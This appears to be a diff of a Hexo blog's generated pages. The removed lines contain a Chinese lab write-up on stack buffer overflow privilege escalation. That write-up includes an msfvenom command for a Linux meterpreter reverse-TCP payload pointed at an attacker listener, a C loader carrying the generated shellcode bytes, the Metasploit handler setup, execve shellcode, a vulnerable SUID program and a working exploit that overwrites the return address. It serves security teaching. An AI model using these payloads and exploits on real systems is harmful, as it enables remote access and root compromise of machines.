-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; Store the command on stack</span><br><span class="line">xor eax, eax ;Clearing eax register</span><br><span class="line">push eax ;Pushing NULL byte</span><br><span class="line">push &quot;//sh&quot; ;Pushing //sh</span><br><span class="line">push &quot;/bin&quot; ;Pushing /bin</span><br><span class="line">mov ebx, esp ;ebx --&gt; &quot;/bin//sh&quot;: execve()’s 1st argument</span><br><span class="line">; Construct the argument array argv[]</span><br><span class="line">push eax ; argv[1] = 0</span><br><span class="line">push ebx ; argv[0] --&gt; &quot;/bin//sh&quot;</span><br><span class="line">mov ecx, esp ; ecx --&gt; argv[]: execve()’s 2nd argument</span><br><span class="line">; For environment variable</span><br><span class="line">xor edx, edx ; edx = 0: execve()’s 3rd argument</span><br><span class="line">; Invoke execve()</span><br><span class="line">xor eax, eax ;</span><br><span class="line">mov al, 0x0b ; execve()’s system call number</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-<h3 id="四、实验过程"><a href="#四、实验过程" class="headerlink" title="四、实验过程"></a>四、实验过程</h3><h4 id="4-1-编写程序测试-shellcode"><a href="#4-1-编写程序测试-shellcode" class="headerlink" title="4.1 编写程序测试 shellcode"></a>4.1 编写程序测试 shellcode</h4><p><strong>（1）用 msfvenom 生成 shellcode</strong> </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意下面的LHOST是监听端（攻击机）的ip，不是靶机的ip，端口随便</span></span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.44.132 LPORT=8848 -f c -o metershellcode.c </span><br></pre></td></tr></table></figure>
-
-<p>这里先了解一下msfvenom指令：</p>
-<p>msfvenom，目前最流行、最强大、最具扩展性的渗透测试平台软件，是一个用于生成后门（木马）的软件。kali已经默认集成了MSF。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">基本格式</span></span><br><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用选项</span></span><br><span class="line">-l, --list &lt;type&gt; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all</span><br><span class="line"> </span><br><span class="line">-p, --payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line"> </span><br><span class="line">-f, --format &lt; format&gt; 指定输出格式</span><br><span class="line"> </span><br><span class="line">-e, --encoder &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line"> </span><br><span class="line">-a, --arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</span><br><span class="line"> </span><br><span class="line">-o, --out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line"> </span><br><span class="line">-b, --bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;</span><br><span class="line"> </span><br><span class="line">-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line"> </span><br><span class="line">-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line"> </span><br><span class="line">-i, --iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line"> </span><br><span class="line">-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line"> </span><br><span class="line">-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line"> </span><br><span class="line">-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"> </span><br><span class="line">-v, --var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line"> </span><br><span class="line">-t, --timeout &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）</span><br><span class="line"> </span><br><span class="line">-h,--help 查看帮助选项</span><br><span class="line"> </span><br><span class="line">--platform &lt; platform&gt; 指定payload的目标平台</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p>、<img src="/2022/12/06/BOF/image-20221207195806932.png" alt="image-20221207195806932" style="zoom: 67%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207195910590.png" alt="image-20221207195910590"></p>
-<p>这段字符串实际上就是机器码，shellcode的生成过程是这样的：</p>
-<ol>
-<li>使用C语言描述shellcode要完成的逻辑功能</li>
-<li>将C语言翻译成汇编语言</li>
-<li>编译和测试</li>
-<li>测试通过后提取机器码</li>
-</ol>
-<p>这里我们使用msfvenom直接生成了，并保存到了metershellcode.c。</p>
-<p>那我想看一下这段机器码对应的汇编码和C语言怎么办呢？</p>
-<p><strong>（2）编写C程序调用所生成的 shellcode</strong></p>
-<p>call_shellcode.c</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line">    <span class="string">&quot;\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89&quot;</span></span><br><span class="line">    <span class="string">&quot;\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x2c\x84\x68\x02\x00\x22\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0&quot;</span></span><br><span class="line">    <span class="string">&quot;\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd&quot;</span></span><br><span class="line">    <span class="string">&quot;\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb2\x6a\xb0\x03\xcd\x80&quot;</span></span><br><span class="line">    <span class="string">&quot;\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\xcd\x80&quot;</span>;</span><br><span class="line">    <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())buf;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>其中的 buf[]即为第一步里面生成的 buf[]。</p>
-<p>想要看懂这段代码，首先要复习一下<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1cf2aa531d9">函数指针</a>这块的知识，以及C语言执行字节码的方法<code>int (*func)() = (int(*)())buf</code>相当于将机器码码所能实现的功能由函数func来接替了。</p>
-<p>另外，低版本的Linux kernel(seedubuntu)中，打开栈可执行，包括栈在内的各segments都是可执行的，但是高版本的kernel(如kali 2022)，-z execstack仅仅允许stack可以执行。因此，如果把shellcode作为全局变量，在高版本kernel系统中会出现段错误，只需要把shellcode作为局部变量即可实现调用shellcode成功。</p>
-<p><strong>（3）编译程序</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c </span><br></pre></td></tr></table></figure>
-
-<p>kali2022的环境不支持编译32位，如果实在想用kali 2022，请安装：<br>sudo apt-get install libc6-dev-i386 gcc-multilib</p>
-<p>理解<code>-z execstack</code>首先要理解Linux的<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91fae054f922">linux程序保护机制&amp;gcc编译选项 </a></p>
-<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br> gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加<code>-z execstack</code>参数。</p>
-<p><strong>（4）msfconsole命令打开侦听服务，接收来自后门的 reverse shell 连接</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp </span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.44.132 </span><br><span class="line">LHOST =&gt; 192.168.56.103 </span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 8848 </span><br><span class="line">LPORT =&gt; 8848 </span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br></pre></td></tr></table></figure>
-
-<p>exploit&#x2F;multi&#x2F;handler是一个<strong>通用的payload处理程序</strong>，实际上就是一组软件套件，可以代替绝大多数攻击模块，用于处理来自独立payloads或exploits的连接，通常使用msfvenom手动生成。</p>
-<p>具体分类的化MSF有六大类似于上面的功能模块，Exploit Modules渗透攻击模块是其中之一，在本实验其实完全可以用Exploit Modules，这里使用的exploit&#x2F;multi&#x2F;handler是比较通用的模块，Exploit Modules又分为主动攻击模块和被动攻击模块，这里不做赘述。</p>
-<p>Exploit Modules <strong>渗透攻击模块:是利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对远程目标系统访问权的代码组件</strong></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207204754017.png" alt="image-20221207204754017" style="zoom: 80%;"></p>
-<p>另开一个端口，执行a32.out文件	</p>
-<img src="/2022/12/06/BOF/image-20221207204934119.png" alt="image-20221207204934119" style="zoom:80%;">
-
-<p>可以看到攻击机进入了入meterpreter shell，表示能够远程访问目标主机（这里的目标主机还是本机，这里只是为了方便测试shellcode是否能够运行，如果想使用远程靶机，可以在<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/%E4%B8%8B%E8%BD%BD%E9%9D%B6%E6%9C%BA%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%E5%8D%B3%E5%8F%AF%EF%BC%8C%E8%AF%A5%E9%9D%B6%E6%9C%BA%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%9C%A8%E5%BC%80%E5%90%AF%E7%BB%88%E7%AB%AF%E9%83%BD%E4%BC%9A%E6%98%BE%E7%A4%BA%EF%BC%89">https://sourceforge.net/projects/owaspbwa/files/下载靶机，虚拟机直接打开即可，该靶机的账号密码在开启终端都会显示）</a></p>
-<h4 id="4-2-通过栈缓冲区溢出进行提权"><a href="#4-2-通过栈缓冲区溢出进行提权" class="headerlink" title="4.2 通过栈缓冲区溢出进行提权"></a>4.2 通过栈缓冲区溢出进行提权</h4><p>​		在这一步中，我们将使用SeedUbuntu虚拟机进行实验，通过对一个具有 Set-UID 权限的程序进行缓冲区溢出攻击，以达到提权的目的。</p>
-<p>​		这里我们先了解一下<strong>Linux文件权限</strong>以及<strong>suid、euid、ruid</strong>。这些知识点详见我的<a href>Linux笔记</a>。</p>
-<p><strong>（1）环境设置</strong></p>
-<ol>
-<li><p>关闭地址空间随机化</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置&#x2F;bin&#x2F;sh</p>
-<p>​		Ubuntu OS 中，&#x2F;bin&#x2F;sh 的符号链接指向&#x2F;bin&#x2F;dash shell，而 dash shell 中实现 了安全对策，用于防止 dash 以 SUID 权限运行。如果 dash 监测到被运行为 SUID 进程，则立即修改其EUID 为进程的RUID。&#x2F;bin&#x2F;bash 也实现了类似的机制。 因此，无法通过这&#x2F;bin&#x2F;dash 或者&#x2F;bin&#x2F;bash 实现提权的效果。为了通过运行&#x2F;bin&#x2F;sh 实现提 权的效果，需要将其链接到没有实施防御措施的 shell 程序，这里选择&#x2F;bin&#x2F;zsh。 命令： <code>sudo ln -sf /bin/zsh /bin/sh </code></p>
-</li>
-</ol>
-<p><strong>（2）编译目标程序</strong></p>
-<p>有漏洞的程序如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Vunlerable program: stack.c */</span> </span><br><span class="line"><span class="comment">/* You can get this program from the lab&#x27;s website */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack. </span></span><br><span class="line"><span class="comment"> * Instructors can change this value each year, so students </span></span><br><span class="line"><span class="comment"> * won&#x27;t be able to use the solutions from the past. </span></span><br><span class="line"><span class="comment"> * Suggested value: between 0 and 400 */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 24 </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> </span><br><span class="line">&#123; </span><br><span class="line"> <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"> <span class="comment">/* The following statement has a buffer overflow problem */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buffer, str); </span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span><br><span class="line">&#123; </span><br><span class="line"> <span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"> FILE *badfile;</span><br><span class="line"> <span class="comment">/* Change the size of the dummy array to randomize the parameters </span></span><br><span class="line"><span class="comment"> for this lab. Need to use the array at least once */</span> </span><br><span class="line"> <span class="type">char</span> dummy[BUF_SIZE]; </span><br><span class="line"> <span class="built_in">memset</span>(dummy, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line"> badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line"> bof(str);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>构建目标程序：<code>gcc -m32 -o stack -z execstack -fno-stack-protector stack.c </code></p>
-<p><strong>（3）修改目标程序权限</strong></p>
-<p><strong>首先，切换到 root 用户，命令</strong><code>sudo -i</code>。然后，运行以下命令：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件stack的所有者为root</span></span><br><span class="line">chown root stack</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">给stack文件加上SUID</span></span><br><span class="line">chmod 4755 stack</span><br></pre></td></tr></table></figure>
-
-<p><strong>（4）分析程序二进制代码</strong></p>
-<p>.<img src="/2022/12/06/BOF/image-20221210181023314.png" alt="image-20221210181023314" style="zoom: 67%;"></p>
-<p>反汇编main函数</p>
-<p>·<img src="/2022/12/06/BOF/image-20221210181107661.png" alt="image-20221210181107661" style="zoom:67%;"></p>
-<p>找到call …<bof>语句</bof></p>
-<p>其前面的语句 lea ……ebp - 0x211 则为 str 的地址，把 shellcode 放到 str 首地址偏移100的位置，计算 shellcode 起始地址：</p>
-<p>.<img src="/2022/12/06/BOF/image-20221210192259837.png" alt="image-20221210192259837"></p>
-<p>即shellcode起始地址为0xbffff21b。</p>
-<p>继续分析程序，确定RIP地址。</p>
-<p>·<img src="/2022/12/06/BOF/image-20221210181404705.png" alt="image-20221210181404705" style="zoom:67%;"></p>
-<p>找到 call ………&lt;strcpy…&gt;语句 其前面的语句 lea ……ebp - 0x20 则为 buffer 的地址。</p>
-<p>则 buffer 的起始地址到 ebp 的距离为 0x20，那么 buffer 的起始地址到 return address 的距离为 0x20 + 4 &#x3D; 0x24 。这个4是怎么来的呢，看一下下面这个图：</p>
-<p>.<img src="/2022/12/06/BOF/image-20221210202303739.png" alt="image-20221210202303739" style="zoom:67%;"></p>
-<p>因此在此偏移量位置存放跳转（shellcode）地址。</p>
-<p><strong>（5）编写利用程序</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*exploit.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;</span></span><br><span class="line">  <span class="string">&quot;\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span> ;</span><br><span class="line"><span class="type">char</span> shellcode_address[]=<span class="string">&quot;\x1b\xf2\xff\xbf&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">517</span>];</span><br><span class="line">    FILE *badfile;</span><br><span class="line">    <span class="comment">/*Initialize buffer with 0x90 (NOP instruction)*/</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, <span class="number">517</span>);</span><br><span class="line">    <span class="comment">/*You need to fill the buffer with appropriate contents here */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer+<span class="number">100</span>, shellcode);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer+<span class="number">0x24</span>, shellcode_address, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">/*Save the contents to the file &quot;badfile&quot;*/</span></span><br><span class="line">    badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(buffer, <span class="number">517</span>, <span class="number">1</span>, badfile);</span><br><span class="line">    fclose(badfile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译并运行利用程序：<code>gcc -o exploit exploit.c</code></p>
-<p><img src="/2022/12/06/BOF/image-20221210182323050.png" alt="image-20221210182323050" style="zoom:67%;">.</p>
-<p><strong>（6）漏洞利用</strong></p>
-<p>因为 badfile 已经准备好了，因此直接运行 stack 程序即可。</p>
-<img src="/2022/12/06/BOF/image-20221210192633429.png" alt="image-20221210192633429" style="zoom:67%;">
-
-<p>至此，栈溢出提权实验就完成了。</p>
-<h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><ol>
-<li><a target="_blank" rel="noopener" href="https://www.steamboat-software.com/article/%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97scannerip%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D.html#:~:text=Exploit%20Modules%20%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%3A%E6%98%AF%E5%88%A9%E7%94%A8%E5%8F%91%E7%8E%B0%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%88%96%E9%85%8D%E7%BD%AE%E5%BC%B1%E7%82%B9%E5%AF%B9%E8%BF%9C%E7%A8%8B%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%A5%E6%A4%8D%E5%85%A5%E5%92%8C%E8%BF%90%E8%A1%8C%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%BE%97%E5%AF%B9%E8%BF%9C%E7%A8%8B%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E8%AE%BF%E9%97%AE%E6%9D%83%E7%9A%84%E4%BB%A3%E7%A0%81%E7%BB%84%E4%BB%B6%20Encoders,%E7%BC%96%E7%A0%81%E6%A8%A1%E5%9D%97%EF%BC%9A%E9%92%88%E5%AF%B9%20payload%20%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%A4%9A%E7%A7%8D%E7%BC%96%E7%A0%81%E6%89%8B%E6%AE%B5%E3%80%81%E5%A4%9A%E6%AC%A1%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E6%9C%89%E6%95%88%E7%9A%84%E6%94%B9%E5%8F%98%20payload%20%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81">MSF攻击实验</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91fae054f922">linux程序保护机制&amp;gcc编译选项 </a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1cf2aa531d9">函数指针</a></li>
-</ol>
-
+    
+    <a class="article-more-a" href="/2022/12/06/BOF/#more">more >></a>
+    
     
 
     
@@ -653,6 +351,18 @@
 			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">进程的内存空间分布</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">gdb调试</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">汇编基础</a>
         		</li>
       		
 		</ul>
@@ -720,6 +430,8 @@
   </header>
   
   <div class="article-entry" itemprop="articleBody">
+    
+      <!-- Table of Contents -->
     
     <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
@@ -868,25 +580,17 @@
       
       
     
-      
-      
-      
-    
     
 
     <ul style="width: 70%">
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
-        
-      
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
       
         
     </ul>
@@ -907,11 +611,27 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络安全</a>
+                <a href="javascript:void(0)" class="js-tag color5">进程的内存空间分布</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">gdb调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">汇编基础</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
             
             <div class="clearfix"></div>
@@ -957,24 +677,6 @@
     	</section>
     
 
-    
-    	<section class="tools-section tools-section-friends" q-show="friends">
-  		
-        <ul class="search-ul">
-          
-            <li class="search-li">
-              <a href="https://github.com/bushilushan" target="_blank" 
-                class="search-title" >
-                
-                  <i class="icon-link icon"></i>
-                
-                GitHub
-              </a>
-            </li>
-          
-        </ul>
-  		
-    	</section>
     
 
     
